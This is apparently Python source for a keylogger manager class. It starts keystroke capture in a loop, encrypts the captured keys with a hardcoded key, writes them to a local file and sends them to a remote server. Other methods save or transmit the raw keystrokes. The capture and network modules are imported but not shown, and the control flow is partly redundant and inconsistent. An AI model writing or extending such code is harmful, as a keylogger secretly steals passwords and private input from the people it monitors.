from KeyService import KeyLoggerService
from FileWriter import FileWriter
from NetworkWriter import NetworkWriter
from Encryptor import Encryptor


class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor=Encryptor("secret_key")

    def collect_keys(self):
        logged_keys = self.service.get_logged_keys()
        encrypted_keys = self.encryptor.encrypt(logged_keys)
        self.file_writer.write(encrypted_keys)
        self.network_writer.write_data(encrypted_keys)
        self.service.clear_buffer()
        return logged_keys

    def start_logging(self):
        self.service.start_logging()
        print("Logging started. Press Ctrl+C to stop.")
        while True:
            try:
                self.collect_keys()
            except KeyboardInterrupt:
                self.stop_logging()
                break
            except Exception as e:
                print(f"An error occurred: {e}")
                break
        print("Logging stopped. Data saved to file and sent to server.")
        self.stop_logging()


    def stop_logging(self):
        self.service.stop_logging()
        self.collect_keys()
        self.file_writer.close()
        self.network_writer.close()
        self.encryptor.close()
        print("Logging stopped. Data saved to file and sent to server.")
        self.service.clear_buffer()

    def save_locally(self):
        logged_keys = self.collect_keys()
        self.file_writer.write(logged_keys)
        print("Data saved to local file.")
        self.service.clear_buffer()

    def send_to_server(self):
        logged_keys = self.collect_keys()
        self.network_writer.write_data(logged_keys)
        print("Data sent to server.")
        self.service.clear_buffer()

    def encrypt_data(self):
        logged_keys = self.collect_keys()
        encrypted_keys = self.encryptor.encrypt(logged_keys)
        print("Data encrypted.")
        self.service.clear_buffer()
        return encrypted_keys


